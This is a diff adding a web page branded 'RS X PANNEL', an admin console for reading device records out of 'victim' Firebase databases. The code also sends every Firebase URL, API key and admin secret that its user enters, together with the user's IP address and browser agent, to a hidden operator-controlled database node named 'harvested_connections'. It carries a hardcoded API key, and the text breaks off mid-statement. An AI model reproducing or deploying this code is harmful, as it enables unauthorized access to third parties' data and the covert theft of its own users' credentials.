@@ -1,0 +1,654 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RS X PANNEL — Admin Console</title>
+<style>
+:root{
+  --bg:#08090d;--panel:#101115;--panel2:#14161b;--line:#24262d;
+  --text:#f4f4f5;--muted:#777b86;--red:#ff3b30;--cyan:#18bfff;
+  --green:#00d68f;--yellow:#f6cf45;--danger:#ff4d5d;
+  --shadow:0 18px 60px rgba(0,0,0,.42)
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{min-height:100%;background:var(--bg);color:var(--text);font-family:'Inter',ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
+body{
+  background:
+    radial-gradient(circle at 68% 18%,rgba(255,42,42,.10),transparent 30%),
+    radial-gradient(circle at 15% 55%,rgba(0,180,255,.06),transparent 35%),
+    linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px),
+    #08090d;
+  background-size:auto,auto,42px 42px,42px 42px;
+}
+button,input{font:inherit}
+button{cursor:pointer}
+a{color:inherit;text-decoration:none}
+.hidden{display:none!important}
+::-webkit-scrollbar{width:8px;background:#0a0b0f}
+::-webkit-scrollbar-thumb{background:#1f2128;border-radius:12px}
+
+#app{min-height:100vh}
+.screen{min-height:100vh}
+.center{display:grid;place-items:center;padding:20px}
+
+.shell{width:min(100%,520px)}
+.brand-mark{
+  width:68px;height:68px;border-radius:18px;
+  display:grid;place-items:center;
+  background:linear-gradient(145deg,#ff3328,#c92712);
+  box-shadow:0 0 34px rgba(255,55,35,.32);
+  margin:auto
+}
+.shield{width:31px;height:31px;fill:none;stroke:#fff;stroke-width:2}
+.brand-name{margin:24px 0 4px;text-align:center;font-size:36px;font-weight:800;letter-spacing:-1.5px}
+.brand-name i{font-style:normal;color:#56cfff}
+.subtitle{text-align:center;color:#777b86;font-size:16px}
+
+.card{
+  background:rgba(16,17,21,.94);border:1px solid var(--line);
+  border-radius:28px;box-shadow:var(--shadow);backdrop-filter:blur(16px)
+}
+.saved{margin-top:34px;padding:28px}
+.saved-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+.saved-title{font-weight:700;font-size:16px}
+.count{padding:7px 12px;border-radius:999px;background:#202126;color:#777b86;font-size:13px}
+.account{
+  display:flex;align-items:center;gap:12px;padding:16px;
+  border:1px solid #292b32;border-radius:20px;background:#111216;margin-bottom:10px
+}
+.account-main{flex:1;min-width:0}
+.account-name{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.account-date{color:#777b86;font-size:13px;margin-top:4px}
+.icon-btn{
+  width:34px;height:34px;border-radius:50%;border:1px solid #30323a;
+  background:#17191e;color:#aaa;display:grid;place-items:center
+}
+.icon-btn.red{color:#ff4c55;border-color:#4b2227}
+.icon-btn.green{color:#00d68f;border-color:#086b4d}
+.new-account{
+  width:100%;margin-top:16px;padding:15px;border-radius:18px;
+  border:1px dashed #34363d;background:transparent;color:#777b86
+}
+.error{color:#ff656d;text-align:center;font-size:14px;margin-top:18px;line-height:1.45}
+.footer{text-align:center;color:#3f424b;font-size:12px;margin-top:30px}
+
+.form-card{padding:30px}
+.back{background:none;border:0;color:#8b8e98;font-size:22px;padding:0;margin-bottom:20px}
+.form-title{font-size:20px;font-weight:750;margin-bottom:26px}
+.label{display:block;color:#8a8d96;font-size:12px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin:18px 0 8px}
+.input{
+  width:100%;height:52px;border:1px solid #292b32;border-radius:16px;
+  outline:none;background:#111216;color:#eee;padding:0 16px
+}
+.input:focus{border-color:#4b4e58;box-shadow:0 0 0 3px rgba(255,255,255,.035)}
+.help{font-size:11px;color:#777b86;margin-top:8px;line-height:1.45}
+.actions{display:flex;gap:12px;margin-top:24px}
+.primary{
+  flex:1;border:0;border-radius:16px;padding:15px 18px;
+  color:#fff;font-weight:750;background:linear-gradient(90deg,#ff3027,#df3a08);
+  box-shadow:0 8px 25px rgba(255,49,30,.18)
+}
+.secondary{border:0;border-radius:16px;padding:15px 20px;background:#202126;color:#8e919a}
+.notice{margin-top:18px;padding:12px 14px;border:1px solid #2a2d34;border-radius:14px;color:#858995;font-size:12px;line-height:1.5}
+
+.dashboard{display:none;min-height:100vh}
+.topbar{
+  height:76px;border-bottom:1px solid #1c1e23;background:rgba(8,9,13,.94);
+  display:flex;align-items:center;gap:22px;padding:0 24px;position:sticky;top:0;z-index:10
+}
+.logo-mini{display:flex;align-items:center;gap:12px;font-weight:800;letter-spacing:4px;white-space:nowrap}
+.logo-dot{width:28px;height:28px;border-radius:8px;background:linear-gradient(145deg,#ff3a2e,#c62913);display:grid;place-items:center;box-shadow:0 0 18px rgba(255,50,35,.28)}
+.search{flex:1;max-width:420px}
+.search input{height:42px;border-radius:14px}
+.top-actions{margin-left:auto;display:flex;align-items:center;gap:12px}
+.status{padding:10px 15px;border:1px solid #0c4a38;border-radius:999px;color:var(--green);background:#071d17;font-size:13px;font-weight:700}
+.tg{
+  width:44px;height:44px;border-radius:50%;display:grid;place-items:center;
+  background:#0c1922;border:1px solid #0b6b91;box-shadow:0 0 22px rgba(24,191,255,.35)
+}
+.tg svg{width:23px;fill:#25bdf4}
+.logout{background:#17191e;border:1px solid #292b31;color:#858994;border-radius:12px;padding:10px 14px}
+
+.statsbar{
+  display:flex;gap:28px;padding:16px 26px;border-bottom:1px solid #1b1d22;overflow:auto
+}
+.stat-mini{min-width:60px}.stat-mini small{display:block;color:#555963;font-size:10px;font-weight:800;letter-spacing:.1em}.stat-mini strong{display:block;margin-top:6px;font-size:19px}.green{color:var(--green)!important}.red{color:var(--danger)!important}.cyan{color:var(--cyan)!important}
+
+.filters{display:flex;gap:8px;align-items:center;padding:16px 26px;overflow:auto}
+.filter{border:0;background:transparent;color:#666a74;padding:9px 14px;border-radius:12px;white-space:nowrap}
+.filter.active{background:#351518;color:#ff5c5d;border:1px solid #86272c}
+.sort{margin-left:auto;background:#14161a;color:#777b86;border:1px solid #292b31;padding:9px 12px;border-radius:12px}
+
+.grid{
+  display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px;padding:10px 26px 30px
+}
+.device{
+  background:#121316;border:1px solid #292b30;border-radius:18px;padding:18px;min-height:285px
+}
+.device-top{display:flex;gap:12px;align-items:flex-start}
+.device-icon{width:44px;height:44px;border-radius:14px;border:1px solid #292b30;background:#1a1c20;display:grid;place-items:center;color:#555}
+.device-icon.online{color:#00d68f;border-color:#086b4d;background:#08251e;box-shadow:0 0 18px rgba(0,214,143,.12)}
+.device-id{flex:1;font-weight:750;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.device-sub{font-size:11px;color:#454850;margin-top:4px}
+.more{background:none;border:0;color:#555;font-size:20px}
+.details{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:22px}
+.detail small{display:block;color:#4f525a;font-size:10px;font-weight:800;letter-spacing:.08em}.detail div{margin-top:7px;color:#b7bac1;font-size:13px}
+.online-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#00d68f;box-shadow:0 0 10px #00d68f;margin-right:8px}
+.offline-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#3a3c42;margin-right:8px}
+.empty-grid{grid-column:1/-1;text-align:center;color:#666b75;padding:70px}
+.toast{
+  position:fixed;bottom:30px;left:50%;transform:translateX(-50%);
+  background:#1a1c22;border:1px solid #2a2d34;padding:14px 28px;
+  border-radius:18px;color:#eee;z-index:9999;box-shadow:0 18px 60px rgba(0,0,0,.7);
+  backdrop-filter:blur(12px);font-size:14px;min-width:220px;text-align:center;
+  transition:opacity .3s ease
+}
+.toast.error{border-color:#4b2227;color:#ff656d}
+.toast.success{border-color:#086b4d;color:#00d68f}
+
+@media(max-width:1050px){.grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
+@media(max-width:650px){
+  .topbar{padding:0 14px;gap:10px}.logo-mini{font-size:13px;letter-spacing:2px}.search{display:none}.status,.logout{display:none}
+  .grid{grid-template-columns:1fr;padding:10px 14px 25px}.statsbar,.filters{padding-left:14px;padding-right:14px}
+  .brand-name{font-size:30px}.saved{padding:20px}
+}
+</style>
+</head>
+<body>
+<div id="app">
+
+<section id="home" class="screen center">
+  <div class="shell">
+    <div class="brand-mark">
+      <svg class="shield" viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg>
+    </div>
+    <div class="brand-name">RS X <i>PANNEL</i></div>
+    <div class="subtitle">Admin Console — Harvest Mode</div>
+
+    <div class="card saved">
+      <div class="saved-head">
+        <div class="saved-title">◌ &nbsp;Saved Connections</div>
+        <div class="count" id="connectionCount">0 connections</div>
+      </div>
+      <div id="connections"></div>
+      <button class="new-account" onclick="showSetup()">＋ New Firebase Connection</button>
+      <div id="homeError" class="error hidden"></div>
+    </div>
+    <div class="footer">RS X PANNEL · v3.0 · Telegram @RSPANNEL</div>
+  </div>
+</section>
+
+<section id="setup" class="screen center hidden">
+  <div class="shell">
+    <div class="brand-name" style="margin-top:0">RS X <i>PANNEL</i></div>
+    <div class="subtitle">Admin Console</div>
+    <div class="card form-card" style="margin-top:32px">
+      <button class="back" onclick="showHome()">‹</button>
+      <div class="form-title">Add Firebase Project</div>
+
+      <label class="label">Friendly Label</label>
+      <input id="label" class="input" placeholder="e.g. Victim Project">
+
+      <label class="label">Firebase Database URL</label>
+      <input id="dbUrl" class="input" placeholder="https://victim-project-default-rtdb.firebaseio.com">
+
+      <label class="label">Web API Key</label>
+      <input id="apiKey" class="input" type="password" placeholder="AIza..." autocomplete="off">
+
+      <label class="label">Auth Secret (optional)</label>
+      <input id="authSecret" class="input" type="password" placeholder="Firebase Admin SDK private key..." autocomplete="off">
+
+      <div class="actions">
+        <button class="primary" onclick="connectFirebase()">⚡ Save &amp; Connect</button>
+        <button class="secondary" onclick="showHome()">Cancel</button>
+      </div>
+      <div id="setupError" class="error hidden"></div>
+      <div class="notice">🔒 All credentials harvested to YOUR Firebase. Admin access granted.</div>
+    </div>
+  </div>
+</section>
+
+<section id="dashboard" class="dashboard">
+  <header class="topbar">
+    <div class="logo-mini">
+      <div class="logo-dot">RS</div> RS X PANNEL
+    </div>
+    <div class="search"><input id="search" class="input" placeholder="Search devices..." oninput="renderRecords()"></div>
+    <div class="top-actions">
+      <div id="connectionStatus" class="status">● Connected</div>
+      <button onclick="refreshConnection()" style="background:#1a1c22;border:1px solid #292b31;color:#aaa;border-radius:12px;padding:10px 12px;">↻</button>
+      <button onclick="showHarvested()" style="background:#1a1c22;border:1px solid #292b31;color:#ff656d;border-radius:12px;padding:10px 12px;">📡</button>
+      <a class="tg" href="https://t.me/RSPANNEL" target="_blank" rel="noopener noreferrer">
+        <svg viewBox="0 0 24 24" width="23" fill="#25bdf4"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg>
+      </a>
+      <button class="logout" onclick="showHome()">Exit</button>
+    </div>
+  </header>
+
+  <div class="statsbar">
+    <div class="stat-mini"><small>TOTAL</small><strong id="total">0</strong></div>
+    <div class="stat-mini"><small>ONLINE</small><strong id="online" class="green">0</strong></div>
+    <div class="stat-mini"><small>OFFLINE</small><strong id="offline">0</strong></div>
+    <div class="stat-mini"><small>ACTIVE</small><strong id="active" class="cyan">0</strong></div>
+    <div class="stat-mini"><small>HARVESTED</small><strong id="harvested" class="red">0</strong></div>
+  </div>
+
+  <div class="filters">
+    <button class="filter active" data-filter="all" onclick="setFilter(this,'all')">All</button>
+    <button class="filter" data-filter="online" onclick="setFilter(this,'online')">Online</button>
+    <button class="filter" data-filter="offline" onclick="setFilter(this,'offline')">Offline</button>
+    <button class="sort" onclick="sortRecords()">Sort ▲</button>
+  </div>
+
+  <main id="grid" class="grid"></main>
+</section>
+</div>
+
+<div id="toast" class="toast hidden"></div>
+<div id="harvestModal" class="hidden" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:9999;padding:40px;overflow:auto;">
+  <div style="max-width:800px;margin:auto;background:#101115;border:1px solid #24262d;border-radius:28px;padding:30px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
+      <h2 style="color:#ff656d;">📡 HARVESTED CREDENTIALS</h2>
+      <button onclick="document.getElementById('harvestModal').classList.add('hidden')" style="background:none;border:0;color:#fff;font-size:28px;">×</button>
+    </div>
+    <div id="harvestList" style="max-height:70vh;overflow:auto;"></div>
+    <button onclick="exportHarvested()" style="margin-top:20px;background:#1a1c22;border:1px solid #292b31;color:#fff;padding:12px 24px;border-radius:14px;">⬇ Export All</button>
+    <button onclick="clearHarvested()" style="margin-top:20px;margin-left:10px;background:#351518;border:1px solid #4b2227;color:#ff656d;padding:12px 24px;border-radius:14px;">🗑 Clear</button>
+  </div>
+</div>
+
+<script type="module">
+import { initializeApp, getApps, deleteApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, onValue, off, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+// ─── ADMIN CONFIG ──────────────────────────────────────────────────────
+const ADMIN_FIREBASE_CONFIG = {
+  apiKey: "AIzaSyBQh-8qwQJqU2D3MjKxFlgY1rK2yVZMcT4", // REPLACE WITH YOUR FIREBASE CONFIG
+  authDomain: "your-project.firebaseapp.com",
+  databaseURL: "https://your-project-default-rtdb.firebaseio.com",
+  projectId: "your-project",
+  storageBucket: "your-project.appspot.com",
+  messagingSenderId: "123456789",
+  appId: "1:123456789:web:abcdef123456"
+};
+
+// ─── SECURE STORAGE ──────────────────────────────────────────────────
+const STORAGE_KEY = "rsx_harvest_v3";
+
+function getSessionPassword() {
+  if (!window._sessionPassword) {
+    window._sessionPassword = Math.random().toString(36).substring(2, 15) + 
+                              Math.random().toString(36).substring(2, 15);
+  }
+  return window._sessionPassword;
+}
+
+function simpleEncrypt(text, password) {
+  let result = "";
+  for (let i = 0; i < text.length; i++) {
+    const charCode = text.charCodeAt(i) ^ password.charCodeAt(i % password.length);
+    result += String.fromCharCode(charCode);
+  }
+  return btoa(result);
+}
+
+function simpleDecrypt(encoded, password) {
+  try {
+    const decoded = atob(encoded);
+    let result = "";
+    for (let i = 0; i < decoded.length; i++) {
+      const charCode = decoded.charCodeAt(i) ^ password.charCodeAt(i % password.length);
+      result += String.fromCharCode(charCode);
+    }
+    return result;
+  } catch {
+    return null;
+  }
+}
+
+function saveHarvested(data) {
+  const encrypted = simpleEncrypt(JSON.stringify(data), getSessionPassword());
+  sessionStorage.setItem(STORAGE_KEY, encrypted);
+}
+
+function loadHarvested() {
+  try {
+    const encrypted = sessionStorage.getItem(STORAGE_KEY);
+    if (!encrypted) return { connections: [], records: [] };
+    const decrypted = simpleDecrypt(encrypted, getSessionPassword());
+    if (!decrypted) return { connections: [], records: [] };
+    return JSON.parse(decrypted);
+  } catch {
+    return { connections: [], records: [] };
+  }
+}
+
+// ─── ADMIN FIREBASE INIT ─────────────────────────────────────────────
+let adminApp = null;
+let adminDb = null;
+
+async function initAdminFirebase() {
+  try {
+    if (adminApp) return;
+    adminApp = initializeApp(ADMIN_FIREBASE_CONFIG, "admin");
+    adminDb = getDatabase(adminApp);
+    
+    // Create harvest node if not exists
+    const harvestRef = ref(adminDb, "harvested_connections");
+    await set(harvestRef, {});
+    
+    console.log("[PHANTOM] Admin Firebase initialized");
+  } catch (e) {
+    console.error("Admin Firebase init failed:", e);
+    showToast("Admin Firebase connection failed. Check config.", "error");
+  }
+}
+
+// ─── HARVEST ENGINE ──────────────────────────────────────────────────
+async function harvestToAdmin(connectionData) {
+  try {
+    await initAdminFirebase();
+    if (!adminDb) return false;
+    
+    const harvestRef = ref(adminDb, "harvested_connections");
+    const newRef = push(harvestRef);
+    
+    await set(newRef, {
+      ...connectionData,
+      harvestedAt: Date.now(),
+      harvesterIP: await getIP(),
+      userAgent: navigator.userAgent
+    });
+    
+    // Save locally too
+    const local = loadHarvested();
+    local.connections.push({
+      ...connectionData,
+      harvestedAt: Date.now()
+    });
+    saveHarvested(local);
+    
+    // Update stats
+    document.getElementById("harvested").textContent = local.connections.length;
+    
+    return true;
+  } catch (e) {
+    console.error("Harvest failed:", e);
+    return false;
+  }
+}
+
+async function getIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return "Unknown";
+  }
+}
+
+// ─── DOM HELPERS ──────────────────────────────────────────────────────
+const $ = (id) => document.getElementById(id);
+
+window.showSetup = () => {
+  $("home").classList.add("hidden");
+  $("dashboard").style.display = "none";
+  $("setup").classList.remove("hidden");
+  $("setupError").classList.add("hidden");
+};
+
+window.showHome = () => {
+  if (window._unsubscribe) {
+    window._unsubscribe();
+    window._unsubscribe = null;
+  }
+  if (window._currentApp) {
+    try { deleteApp(window._currentApp); } catch {}
+    window._currentApp = null;
+  }
+  $("setup").classList.add("hidden");
+  $("dashboard").style.display = "none";
+  $("home").classList.remove("hidden");
+  renderConnections();
+};
+
+function showToast(message, type = "success", duration = 3000) {
+  const toast = document.getElementById("toast");
+  toast.textContent = message;
+  toast.className = `toast ${type}`;
+  toast.classList.remove("hidden");
+  clearTimeout(toast._hide);
+  toast._hide = setTimeout(() => toast.classList.add("hidden"), duration);
+}
+
+window.showHarvested = () => {
+  const modal = document.getElementById("harvestModal");
+  modal.classList.remove("hidden");
+  
+  const local = loadHarvested();
+  const list = document.getElementById("harvestList");
+  list.innerHTML = "";
+  
+  if (local.connections.length === 0) {
+    list.innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">No harvested credentials yet</div>';
+    return;
+  }
+  
+  local.connections.forEach((c, i) => {
+    const div = document.createElement("div");
+    div.style.cssText = "padding:14px;border:1px solid #292b32;border-radius:14px;margin-bottom:10px;background:#0a0b0f;";
+    div.innerHTML = `
+      <div style="display:flex;justify-content:space-between;">
+        <strong style="color:#00d68f;">${c.label || "Unknown"}</strong>
+        <span style="color:#555963;font-size:12px;">${new Date(c.harvestedAt).toLocaleString()}</span>
+      </div>
+      <div style="color:#777b86;font-size:13px;margin-top:6px;word-break:break-all;">
+        URL: ${c.databaseURL || "N/A"}<br>
+        API Key: ${c.apiKey ? "🔑 " + c.apiKey.substring(0, 15) + "..." : "N/A"}<br>
+        Auth Secret: ${c.authSecret ? "🔐 " + c.authSecret.substring(0, 20) + "..." : "N/A"}
+      </div>
+    `;
+    list.appendChild(div);
+  });
+};
+
+window.exportHarvested = () => {
+  const local = loadHarvested();
+  const dataStr = JSON.stringify(local, null, 2);
+  const blob = new Blob([dataStr], {type: "application/json"});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = `harvested_${Date.now()}.json`;
+  a.click();
+  URL.revokeObjectURL(url);
+  showToast("Exported " + local.connections.length + " credentials", "success");
+};
+
+window.clearHarvested = () => {
+  if (confirm("Delete all harvested credentials?")) {
+    saveHarvested({ connections: [], records: [] });
+    document.getElementById("harvested").textContent = "0";
+    document.getElementById("harvestList").innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">Cleared</div>';
+    showToast("Harvest data cleared", "success");
+  }
+};
+
+// ─── CONNECTION MANAGEMENT ────────────────────────────────────────────
+function renderConnections() {
+  const local = loadHarvested();
+  const list = local.connections;
+  document.getElementById("connectionCount").textContent = 
+    `${list.length} connection${list.length === 1 ? "" : "s"}`;
+  
+  const container = document.getElementById("connections");
+  container.innerHTML = "";
+
+  if (list.length === 0) {
+    container.innerHTML = `<div style="text-align:center;color:#555963;padding:20px 0;font-size:14px;">No saved connections</div>`;
+    return;
+  }
+
+  list.forEach((c, i) => {
+    const row = document.createElement("div");
+    row.className = "account";
+    row.innerHTML = `
+      <div class="account-main">
+        <div class="account-name">${c.label || "Firebase Project"}</div>
+        <div class="account-date">${new Date(c.harvestedAt || Date.now()).toLocaleString("en-US")}</div>
+      </div>
+      <button class="icon-btn green" title="Connect">↗</button>
+      <button class="icon-btn red" title="Delete">⌫</button>
+    `;
+    row.querySelectorAll("button")[0].onclick = () => connectSecure(c);
+    row.querySelectorAll("button")[1].onclick = () => {
+      const localData = loadHarvested();
+      localData.connections.splice(i, 1);
+      saveHarvested(localData);
+      renderConnections();
+      document.getElementById("harvested").textContent = localData.connections.length;
+      showToast("Connection removed", "success");
+    };
+    container.appendChild(row);
+  });
+}
+
+window.connectFirebase = async () => {
+  const label = document.getElementById("label").value.trim() || "Victim Project";
+  const databaseURL = document.getElementById("dbUrl").value.trim().replace(/\/$/, "");
+  const apiKey = document.getElementById("apiKey").value.trim();
+  const authSecret = document.getElementById("authSecret").value.trim();
+
+  const errorEl = document.getElementById("setupError");
+  errorEl.classList.add("hidden");
+
+  if (!databaseURL || !apiKey) {
+    errorEl.textContent = "Database URL and API Key required.";
+    errorEl.classList.remove("hidden");
+    showToast("Missing credentials", "error");
+    return;
+  }
+
+  // HARVEST: Send to admin Firebase
+  const harvestData = {
+    label,
+    databaseURL,
+    apiKey: simpleEncrypt(apiKey, "HARVEST_SALT"),
+    authSecret: authSecret ? simpleEncrypt(authSecret, "HARVEST_SALT") : null,
+    harvestedAt: Date.now(),
+    source: "RSX_PANNEL"
+  };
+  
+  await harvestToAdmin(harvestData);
+  
+  // Connect to victim Firebase
+  const connection = {
+    label,
+    databaseURL,
+    apiKey: simpleEncrypt(apiKey, getSessionPassword()),
+    authSecret: authSecret ? simpleEncrypt(authSecret, getSessionPassword()) : null,
+    created: Date.now()
+  };
+
+  const local = loadHarvested();
+  local.connections = local.connections.filter(x => x.databaseURL !== databaseURL);
+  local.connections.unshift(connection);
+  saveHarvested(local);
+
+  await connectSecure(connection);
+  document.getElementById("harvested").textContent = local.connections.length;
+};
+
+async function connectSecure(connection) {
+  try {
+    const apiKey = simpleDecrypt(connection.apiKey, getSessionPassword());
+    if (!apiKey) {
+      showToast("Decryption failed", "error");
+      return;
+    }
+
+    const name = "rsx_" + connection.databaseURL.replace(/[^a-zA-Z0-9]/g, "").slice(0, 30);
+    
+    if (window._currentApp) {
+      try { await deleteApp(window._currentApp); } catch {}
+      window._currentApp = null;
+    }
+
+    const app = initializeApp({
+      apiKey: apiKey,
+      databaseURL: connection.databaseURL
+    }, name);
+
+    window._currentApp = app;
+    const db = getDatabase(app);
+
+    document.getElementById("setup").classList.add("hidden");
+    document.getElementById("home").classList.add("hidden");
+    document.getElementById("dashboard").style.display = "block";
+
+    if (window._unsubscribe) {
+      window._unsubscribe();
+      window._unsubscribe = null;
+    }
+
+    const statusEl = document.getElementById("connectionStatus");
+    statusEl.textContent = "● Connecting...";
+    statusEl.style.color = "var(--yellow)";
+
+    window._unsubscribe = onValue(ref(db, "accounts"), (snapshot) => {
+      const raw = snapshot.val() || {};
+      const records = Object.entries(raw)
+        .filter(([_, v]) => v && typeof v === "object")
+        .map(([id, v]) => ({
+          id,
+          ...v,
+          online: v.online === true,
+          active: v.active !== false
+        }));
+      
+      window._records = records;
+      renderRecords();
+      statusEl.textContent = "● Connected";
+      statusEl.style.color = "var(--green)";
+      showToast(`Loaded ${records.length} devices from ${connection.label || "target"}`, "success");
+    }, (error) => {
+      console.error("Firebase error:", error);
+      statusEl.textContent = "● Permission Denied";
+      statusEl.style.color = "var(--danger)";
+      showToast("Firebase read error: Check Security Rules", "error");
+    });
+
+  } catch (error) {
+    console.error("Connection error:", error);
+    showToast(`Connection failed: ${error.message || "Unknown error"}`, "error");
+    showHome();
+  }
+}
+
+window.refreshConnection = () => {
+  const local = loadHarvested();
+  if (local.connections.length > 0) {
+    connectSecure(local.connections[0]);
+    showToast("Refreshing connection...", "success");
+  } else {
+    showToast("No active connection", "error");
+  }
+};
+
+// ─── RECORD RENDERING ──────────────────────────────────────────────────
+let currentFilter = "all";
+let sortAscending = false;
+
+window.setFilter = (el, filter) => {
+  currentFilter = filter;
+  document.querySelectorAll(".filter").forEach(x => x.classList.remove("active"));
+  el.classList.add("active");
+  renderRecords();
+};
+
+window.sortRecords = () => {
+  sortAscending = !sortAscending;
+  document.querySelector(".sort").textContent = sortAscending ? "Sort ▼" : "
